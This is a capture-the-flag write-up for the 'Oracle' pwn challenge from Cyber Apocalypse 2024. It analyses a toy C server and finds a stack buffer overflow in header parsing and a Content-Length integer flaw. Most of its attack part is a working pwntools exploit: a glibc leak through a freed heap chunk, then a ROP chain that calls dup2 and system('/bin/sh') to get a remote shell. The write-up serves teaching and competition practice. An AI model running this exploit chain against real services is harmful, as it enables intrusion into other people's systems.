---
title: "Oracle - Cyber Apocalypse 2024: Hacker Royale"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "rop", "ret2libc", "heap", "unsorted-bin", "canary", "aslr", "pie", "integer-overflow", "stack", "cyber-apocalypse-2024-hacker-r", "cyber-apocalypse-2024-hacker-royal", "2024", "ctf-writeup"]
summary: "Linux Exploitation Expert - HackTricks Training"
source:
  name: "CTFtime writeup #38999"
  url: "https://ctftime.org/writeup/38999"
original_source: "https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/"
ctf:
  name: "Cyber Apocalypse 2024: Hacker Royale"
  year: 2024
  challenge: "Oracle"
---

## Metadata

- **CTF:** Cyber Apocalypse 2024: Hacker Royale
- **Task:** Oracle
- **Author team:** Watch4Hack
- **CTFtime:** <https://ctftime.org/writeup/38999>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/>

---
![Linux Exploitation Expert](https://7rocky.github.io/images/LEE.png)

Linux Exploitation Expert — HackTricks Training

Progress from binary exploitation fundamentals to advanced exploit development in Linux across user space, heap, ARM, kernel, and browser targets.

[View Course](https://hacktricks-training.com/courses/lee/) ×

We are given a 64-bit binary called `oracle`:

`

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`

We also have a `Dockerfile`:

`

```
    FROM ubuntu:20.04
    
    RUN useradd -m ctf
    
    COPY challenge/* /home/ctf/
    
    RUN chown -R ctf:ctf /home/ctf/
    
    WORKDIR /home/ctf
    USER ctf
    
    EXPOSE 9001
    CMD ["./run.sh"]
```

`

## Source code analysis

This time, we are given the source code of the program in C. It is quite large, so I will only put the relevant parts.

The `main` function shows that the program is a server that accepts connections from clients:

`

```
    int main() {
        int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    
        if (server_socket == -1) {
            perror("Failed to create socket!");
            exit(EXIT_FAILURE);
        }
    
        // Set up the server address struct
        struct sockaddr_in server_address;
        server_address.sin_family = AF_INET;
        server_address.sin_addr.s_addr = INADDR_ANY;
        server_address.sin_port = htons(PORT);
    
        // Bind the socket to the specified address and port
        if (bind(server_socket, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) {
            perror("Socket binding failed");
            close(server_socket);
            exit(EXIT_FAILURE);
        }
    
        // Listen for incoming connections
        if (listen(server_socket, 5) == -1) {
            perror("Socket listening failed");
            close(server_socket);
            exit(EXIT_FAILURE);
        }
    
        printf("Oracle listening on port %d\n", PORT);
    
        while(1) {
            client_socket = accept(server_socket, NULL, NULL);
    
            puts("Received a spiritual connection...");
    
            if (client_socket == -1) {
                perror("Socket accept failed");
                continue;
            }
    
            handle_request();
        }
    
        return 0;
    }
```

`

Once a connection arrives on port 9001, the server executes `handle_request`. Notice that this is a blocking server, because it doesn’t handle each client on a separated thread or process. Moreover, the connection is never closed.

This is `handle_request`:

`

```
    void handle_request() {
        // take in the start-line of the request
        // contains the action, the target competitor and the oracle version
        char start_line[MAX_START_LINE_SIZE];
    
        char byteRead;
        ssize_t i = 0;
    
        for (ssize_t i = 0; i < MAX_START_LINE_SIZE; i++) {
            recv(client_socket, &byteRead, sizeof(byteRead), 0);
    
            if (start_line[i-1] == '\r' && byteRead == '\n') {
                start_line[i-1] == '\0';
                break;
            }
    
            start_line[i] = byteRead;
        }
    
        sscanf(start_line, "%7s %31s %15s", action, target_competitor, version);
        parse_headers();
    
        // handle the specific action desired
        if (!strcmp(action, VIEW)) {
            handle_view();
        } else if (!strcmp(action, PLAGUE)) {
            handle_plague();
        } else {
            perror("ERROR: Undefined action!");
            write(client_socket, BAD_REQUEST, strlen(BAD_REQUEST));
        }
    
        // clear all request-specific values for next request
        memset(action, 0, 8);
        memset(target_competitor, 0, 32);
        memset(version, 0, 16);
        memset(headers, 0, sizeof(headers));
    }
```

`

This function starts reading into `start_line`, which is a 1024-byte buffer. This line is a string composed of `action`, `target_competitor` and `version`, separated by whitespaces. It is similar to an HTTP request line (`GET /path HTTP/1.1`).

The way to read information from the socket is interesting, because it reads one byte at a time and stops reading when it finds `\r\n` or the `for` loop reaches the maximum size of the buffer.

Then we have `parse_headers`:

`

```
    void parse_headers() {
        // first input all of the header fields
        ssize_t i = 0;
        char byteRead;
        char header_buffer[MAX_HEADER_DATA_SIZE];
    
        while (1) {
            recv(client_socket, &byteRead, sizeof(byteRead), 0);
    
            // clean up the headers by removing extraneous newlines
            if (!(byteRead == '\n' && header_buffer[i-1] != '\r'))
                header_buffer[i] = byteRead;
    
            if (!strncmp(&header_buffer[i-3], "\r\n\r\n", 4)) {
                header_buffer[i-4] == '\0';
                break;
            }
    
            i++;
        }
    
        // now parse the headers
        const char *delim = "\r\n";
        char *line = strtok(header_buffer, delim);
    
        ssize_t num_headers = 0;
    
        while (line != NULL && num_headers < MAX_HEADERS) {
            char *colon = strchr(line, ':');
    
            if (colon != NULL) {
                *colon = '\0';
    
                strncpy(headers[num_headers].key, line, MAX_HEADER_LENGTH);
                strncpy(headers[num_headers].value, colon+2, MAX_HEADER_LENGTH);        // colon+2 to remove whitespace
                
                num_headers++;
            }
    
            line = strtok(NULL, delim);
        }
    }
```

`

The above function is trying to parse headers like `Content-Length: 1337`. It does it right, but there is a Buffer Overflow vulnerability.

Notice that `header_buffer` is a 1024-byte buffer, but the way to read from the socket is slightly different. This time, the program uses an infinite `while` loop and only stops reading when it finds `\r\n\r\n`. Therefore, we are able to write outside of the buffer limits, causing a Buffer Overflow.

After that, the request can be handled by two different functions, depending on the action (`VIEW` or `PLAGUE`). This is `handle_view`:

`

```
    void handle_view() {
        if (!strcmp(target_competitor, "me")) {
            write(client_socket, "You have found yourself.\n", 25);
        } else if (!is_competitor(target_competitor)) {
            write(client_socket, "No such competitor exists.\n", 27);
        } else {
            write(client_socket, "It has been imprinted upon your mind.\n", 38);
        }
    }
```

`

The above function is useless. This is `handle_plague`:

`

```
    void handle_plague() {
        if(!get_header("Content-Length")) {
            write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED));
            return;
        }
    
        // take in the data
        char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
        char *plague_target = (char *)0x0;
    
        if (get_header("Plague-Target")) {
            plague_target = (char *)malloc(0x40);
            strncpy(plague_target, get_header("Plague-Target"), 0x1f);
        } else {
            write(client_socket, RANDOMISING_TARGET, strlen(RANDOMISING_TARGET));
        }
    
        long len = strtoul(get_header("Content-Length"), NULL, 10);
    
        if (len >= MAX_PLAGUE_CONTENT_SIZE) {
            len = MAX_PLAGUE_CONTENT_SIZE-1;
        }
    
        recv(client_socket, plague_content, len, 0);
    
        if(!strcmp(target_competitor, "me")) {
            write(client_socket, PLAGUING_YOURSELF, strlen(PLAGUING_YOURSELF));
        } else if (!is_competitor(target_competitor)) {
            write(client_socket, PLAGUING_OVERLORD, strlen(PLAGUING_OVERLORD));
        } else { 
            dprintf(client_socket, NO_COMPETITOR, target_competitor);
    
            if (len) {
                write(client_socket, plague_content, len);
                write(client_socket, "\n", 1);
            }
        }
    
        free(plague_content);
    
        if (plague_target) {
            free(plague_target);
        }
    }
```

`

Here we see that we need to use a `Content-Length` header. Then, the program allocates a big chunk (2048 bytes). Then, if we have `Plague-Target` header, it allocates another chunk, but smaller (`0x40`).

After that, the program parses the `Content-Length` header and saves it to a variable called `len`, which is used later to read from the socket and to write to the socket. If our `Content-Length` is greater than 2048, then the program sets `len` to be the maximum size minus 1.

However, there is an Integer Overflow here, because we can use a negative number for `Content-Length`, which will pass the `if` check, but will result in a huge size for `recv` and `write`. This vulnerability is not used in the challenge, but it is worth mentioning. Actually, it was only exploitable to read out of bounds, because `write` just errored out.

The allocated chunks are freed before the function returns.

## Exploit strategy

To sum up, we have a Buffer Overflow vulnerability, but it is not exploitable from the start because the binary is compiled with PIE, so we don’t know any address within the binary or Glibc because of ASLR.

Therefore, we need to find a leak before exploiting the Buffer Overflow vulnerability. We actually can find a Glibc leak when allocating the huge chunk from `handle_plague`. Notice that it is freed once the function returns, but the program runs in server mode. So, if we connect again and allocate again, the chunk will be placed in the same position on the heap. As a result, we can simply write one character and the program will print out the whole chunk to us, which contains a slightly modified `fd` pointer and the `bk` pointer. The chunk is huge, so it is inserted in the Unsorted Bin when freed. As a result, we will get pointers to `main_arena` (inside Glibc).

Once we have Glibc, we can get a lot of ROP gadgets from there and exploit the Buffer Overflow vulnerability with a ROP chain. We will use a simple ret2libc attack, but using `dup2` to copy the file descriptors `0`, `1` and `2` (`stdin`, `stdout` and `stderr`) to the socket file descriptor. We know that the socket file descriptor usually starts at `4`, and it increases on each connection (it is never closed).

## Exploit development

Instead of running the program locally, we will use the Docker container and attach GDB to it:

`

```
    $ ./build_docker.sh
    [+] Building 1.4s (10/10) FINISHED                              docker:default
     => [internal] load build definition from Dockerfile                      0.0s
     => => transferring dockerfile: 197B                                      0.0s
     => [internal] load metadata for docker.io/library/ubuntu:20.04           0.8s
     => [internal] load .dockerignore                                         0.0s
     => => transferring context: 2B                                           0.0s
     => [internal] load build context                                         0.0s
     => => transferring context: 13.78kB                                      0.0s
     => [1/5] FROM docker.io/library/ubuntu:20.04@sha256:80ef4a44043dec44905  0.0s
     => CACHED [2/5] RUN useradd -m ctf                                       0.0s
     => [3/5] COPY challenge/* /home/ctf/                                     0.1s
     => [4/5] RUN chown -R ctf:ctf /home/ctf/                                 0.3s
     => [5/5] WORKDIR /home/ctf                                               0.0s
     => exporting to image                                                    0.1s
     => => exporting layers                                                   0.1s
     => => writing image sha256:aed917d58e64e3174eab6c886db370c64710af779e1c  0.0s
     => => naming to docker.io/library/oracle                                 0.0s
    Oracle listening on port 9001
```

`

Now we can use the first connection to simply write two chunks in `handle_plague`:

`

```
    io = remote(host, port)
    io.send(b'PLAGUE asdf 1337\r\nContent-Length: 256\r\nPlague-Target: asdf\r\n\r\n' + b'A' * 0x100 + b'\r\n')
    io.recv()
    io.close()
```

`

`

```
    $ python3 solve.py 127.0.0.1:9001
    [*] './oracle'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] Opening connection to 127.0.0.1 on port 9001: Done
    [*] Closed connection to 127.0.0.1 port 9001
```

`

Then, in GDB we see the huge chunk, which is freed, and we have pointers to `0x7ffff7fbfbe0`:

`

```
    $ gdb -q -p $(pidof oracle)
    Attaching to process 4153802
    Reading symbols from target:/home/ctf/oracle...
    (No debugging symbols found in target:/home/ctf/oracle)
    Reading symbols from target:/lib/x86_64-linux-gnu/libc.so.6...
    (No debugging symbols found in target:/lib/x86_64-linux-gnu/libc.so.6)
    Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
    (No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
    
    warning: Target and debugger are in different PID namespaces; thread lists and other data are likely unreliable.  Connect to gdbserver inside the container.
    0x00007ffff7ef32f7 in accept () from target:/lib/x86_64-linux-gnu/libc.so.6
```

`

`

```
    gef> visual-heap -n
    0x555555559000: 0x0000000000000000 0x0000000000000291 | ................ |
    0x555555559010: 0x0001000000000000 0x0000000000000000 | ................ |
    0x555555559020: 0x0000000000000000 0x0000000000000000 | ................ |
    * 7 lines, 0x70 bytes
    0x5555555590a0: 0x0000000000000000 0x0000555555559ec0 | ..........UUUU.. |
    0x5555555590b0: 0x0000000000000000 0x0000000000000000 | ................ |
    * 29 lines, 0x1d0 bytes
    0x555555559290: 0x0000000000000000 0x0000000000000411 | ................ |
    0x5555555592a0: 0x6465766965636552 0x6972697073206120 | Received a spiri |
    0x5555555592b0: 0x6e6f63206c617574 0x2e6e6f697463656e | tual connection. |
    0x5555555592c0: 0x00000000000a2e2e 0x0000000000000000 | ................ |
    0x5555555592d0: 0x0000000000000000 0x0000000000000000 | ................ |
    * 60 lines, 0x3c0 bytes
    0x5555555596a0: 0x0000000000000000 0x0000000000000811 | ................ |  <-  unsortedbins[1/1]
    0x5555555596b0: 0x00007ffff7fbfbe0 0x00007ffff7fbfbe0 | ................ |
    0x5555555596c0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x5555555596d0: 0x4141414141414141 0x4141414141414141 | AAAAAAAAAAAAAAAA |
    * 13 lines, 0xd0 bytes
    0x5555555597b0: 0x0000000000000000 0x0000000000000000 | ................ |
    * 111 lines, 0x6f0 bytes
    0x555555559eb0: 0x0000000000000810 0x0000000000000050 | ........P....... |
    0x555555559ec0: 0x0000000000000000 0x0000555555559010 | ..........UUUU.. |  <-  tcache[idx=3,sz=0x50][1/1]
    0x555555559ed0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559ee0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559ef0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559f00: 0x0000000000000000 0x0000000000020101 | ................ |  <-  top
    0x555555559f10: 0x2068637573206f4e 0x74697465706d6f63 | No such competit |
    0x555555559f20: 0x206664736120726f 0x202e737473697865 | or asdf exists.  |
    ...
    gef> continue
    Continuing.
```

`

Now we can allocate a single byte and get the content of the chunk, getting both addresses in `fd` and `bk`:

`

```
    io = remote(host, port, level='DEBUG')
    io.send(b'PLAGUE asdf 1337\r\nContent-Length: 256\r\n\r\n' + b'A' + b'\r\n')
    io.recvuntil(b'Attempted plague: ')
    glibc.address = u64(io.recvn(16)[8:]) - 0x1ecbe0
    io.success(f'Glibc base address: {hex(glibc.address)}')
    io.close()
```

`

`

```
    [+] Opening connection to 127.0.0.1 on port 9001: Done
    [DEBUG] Sent 0x2c bytes:
        b'PLAGUE asdf 1337\r\n'
        b'Content-Length: 256\r\n'
        b'\r\n'
        b'A\r\n'
    [DEBUG] Received 0x199 bytes:
        00000000  52 61 6e 64  6f 6d 69 73  69 6e 67 20  61 20 74 61  │Rand│omis│ing │a ta│
        00000010  72 67 65 74  20 63 6f 6d  70 65 74 69  74 6f 72 2c  │rget│ com│peti│tor,│
        00000020  20 61 73 20  79 6f 75 20  77 69 73 68  2e 2e 2e 0a  │ as │you │wish│...·│
        00000030  4e 6f 20 73  75 63 68 20  63 6f 6d 70  65 74 69 74  │No s│uch │comp│etit│
        00000040  6f 72 20 61  73 64 66 20  65 78 69 73  74 73 2e 20  │or a│sdf │exis│ts. │
        00000050  54 68 65 79  20 6d 61 79  20 68 61 76  65 20 66 61  │They│ may│ hav│e fa│
        00000060  6c 6c 65 6e  20 62 65 66  6f 72 65 20  79 6f 75 20  │llen│ bef│ore │you │
        00000070  74 72 69 65  64 20 74 6f  20 70 6c 61  67 75 65 20  │trie│d to│ pla│gue │
        00000080  74 68 65 6d  2e 20 41 74  74 65 6d 70  74 65 64 20  │them│. At│temp│ted │
        00000090  70 6c 61 67  75 65 3a 20  41 0d 0a f7  ff 7f 00 00  │plag│ue: │A···│····│
        000000a0  e0 fb fb f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
        000000b0  00 00 00 00  00 00 00 00  41 41 41 41  41 41 41 41  │····│····│AAAA│AAAA│
        000000c0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
        *
        00000190  41 41 41 41  41 41 41 41  0a                        │AAAA│AAAA│·│
        00000199
    [+] Glibc base address: 0x7ffff7dd3000
    [*] Closed connection to 127.0.0.1 port 9001
```

`

The offset to get the base address of Glibc from `main_arena` can be found easily in GDB:

`

```
    gef> p/x 0x7ffff7fbfbe0 - $libc
    $1 = 0x1ecbe0
```

`

At this point, we must find the offset to control the return address from `parse_headers`. For this, we can use a cyclic patern:

`

```
    io = remote(host, port)
    payload = cyclic(2500)
    io.send(b'VIEW asdf 1337\r\n' + payload + b'\r\n\r\n')
    io.recv()
    io.interactive()
```

`

In GDB, we see that the program crashed:

`

```
    Program received signal SIGSEGV, Segmentation fault.
    0x000055555555553d in handle_request ()
```

`

And we have control over the return address at this position:

`

```
    gef> x/s $rsp
    0x7fffffffec98: "uuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaay\r\n\r\n"
    gef> x/i $rip
    => 0x55555555553d <handle_request+386>: ret
    gef> shell pwn cyclic -l uuaa
    2079
```

`

The above is a bit weird, because we expected to modify the return address from `parse_headers`, and also, the offset is not actually 2079, but 2127 (48 bytes more). But we can solve it with a bit of debugging:

Finally, we need to build the ROP chain, which is fairly easy with Glibc.

We can extract the `libc.so.6` file from the Docker container and get some ROP gadgets:

`

```
    $ docker ps -a | grep oracle
    339a835f313a   oracle                            "./run.sh"               35 minutes ago   Up 35 minutes             0.0.0.0:9001->9001/tcp, :::9001->9001/tcp   oracle
    
    $ docker cp -L 339a835f313a:/lib/x86_64-linux-gnu/libc.so.6 .
    Successfully copied 2.03MB to ./.
    
    $ ROPgadget --binary libc.so.6 | grep ': pop r.. ; ret$'
    0x000000000002f709 : pop r12 ; ret
    0x0000000000025b9d : pop r13 ; ret
    0x000000000002601e : pop r14 ; ret
    0x0000000000023b69 : pop r15 ; ret
    0x0000000000036174 : pop rax ; ret
    0x00000000000226c0 : pop rbp ; ret
    0x000000000002fdaf : pop rbx ; ret
    0x0000000000023b6a : pop rdi ; ret
    0x000000000002601f : pop rsi ; ret
    0x000000000002f70a : pop rsp ; ret
```

`

Next, this is the ROP chain (basically, `dup2` and `system`):

`

```
    socket_fd = 6
    
    pop_rdi_ret_addr = glibc.address + 0x23b6a
    pop_rsi_ret_addr = glibc.address + 0x2601f
    
    payload  = b'A' * 2127
    
    for fd in [0, 1, 2]:
        payload += p64(pop_rdi_ret_addr)
        payload += p64(socket_fd)
        payload += p64(pop_rsi_ret_addr)
        payload += p64(fd)
        payload += p64(glibc.sym.dup2)
    
    payload += p64(pop_rdi_ret_addr)
    payload += p64(next(glibc.search(b'/bin/sh')))
    payload += p64(glibc.sym.system)
    
    
    io = remote(host, port)
    io.send(b'VIEW asdf 1337\r\n' + payload + b'\r\n\r\n')
    io.recv()
    io.interactive()
```

`

With all this, we have a shell locally:

`

```
    $ python3 solve.py 127.0.0.1:9001
    [*] './oracle'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] Opening connection to 127.0.0.1 on port 9001: Done
    [*] Closed connection to 127.0.0.1 port 9001
    [+] Opening connection to 127.0.0.1 on port 9001: Done
    [+] Glibc base address: 0x7ffff7dd3000
    [*] Closed connection to 127.0.0.1 port 9001
    [+] Opening connection to 127.0.0.1 on port 9001: Done
    [*] Switching to interactive mode
    $ ls
    flag.txt
    libc.so.6
    oracle
    run.sh
    solve.py
```

`

## Flag

Let’s go remote:

`

```
    $ python3 solve.py 94.237.56.188:47424
    [*] '/root/pwn_oracle/challenge/oracle'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] Opening connection to 94.237.56.188 on port 47424: Done
    [*] Closed connection to 94.237.56.188 port 47424
    [+] Opening connection to 94.237.56.188 on port 47424: Done
    [+] Glibc base address: 0x7f0d1462f000
    [*] Closed connection to 94.237.56.188 port 47424
    [+] Opening connection to 94.237.56.188 on port 47424: Done
    [*] Switching to interactive mode
    $ ls
    flag.txt
    oracle
    run.sh
    $ cat flag.txt
    HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}
```

`

The full exploit code is here: [`solve.py`](https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20Cyber%20Apocalypse/Pwn/Oracle/solve.py).
